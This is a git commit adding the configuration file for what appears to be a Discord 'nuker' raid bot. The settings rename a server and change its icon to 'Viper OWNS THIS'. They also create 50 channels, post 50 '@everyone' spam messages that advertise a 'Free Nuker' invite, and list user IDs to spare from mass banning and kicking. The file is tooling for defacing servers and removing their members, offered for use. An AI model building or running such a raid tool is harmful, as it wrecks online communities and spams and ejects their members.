e99fe028117cf671c80e9fbc9f06a822ab3d3532
Viper <hallobsks827@gmail.com>
2024-08-30 17:01:25 +0200

    Add files via upload

---
+++ config.py
@@ -0,0 +1,42 @@
+SERVER_CONFIG = {
+    "new_name": "Viper own this", 
+    "new_icon": "https://i.pinimg.com/originals/04/ec/f2/04ecf20035482b23a0c12fca78b7bb92.jpg",  
+    "new_description": "Viper OWNS THIS",  
+}
+
+WEBHOOK_CONFIG = {
+    "default_name": "Viper OWNS THIS",   
+}
+
+
+AUTO_RAID_CONFIG = {
+    'num_channels': 50,  
+    'channel_type': 'text',   
+    'channel_name': '.gg/local',  
+    'num_messages': 50,   
+    'message_content': '@everyone https://discord.gg/Mm8Z5rf4Fu Get ur Free Nuker' 
+}
+
+NO_BAN_KICK_ID = {
+    000000000000,       
+    111111111111,     
+    222222222222,
+}
+
+BOT_PRESENCE = {
+    "type": "watching", 
+    "text": "Playing Multi-Purpose tool ;help " 
+}
+
+EMBED_CONFIG = {
+    "title": "Viper OWNS THIS",    
+    "description": "Viper OWNS THIS",            
+    "color": 0xFF5733,      
+    "fields": [
+        {"name": "Viper OWNS THIS", "value": "Viper OWNS THIS", "inline": False},     
+        {"name": "Viper OWNS THIS", "value": "Viper OWNS THIS", "inline": False},
+        {"name": "Viper OWNS THIS", "value": "Viper OWNS THIS", "inline": False},    
+    ],
+    "image": "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcnh6eThmMHhhaDVhMGJjY2pkOTBqMmdtc3Z1ajQ5ZHk0M3M3aWhrdSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/UZKV0kDmkW2MgfKxUL/giphy-downsized-large.gif",   # Embed Icon url here → https://yourimage.com     
+    "footer": "Viper OWNS THIS",     
+}
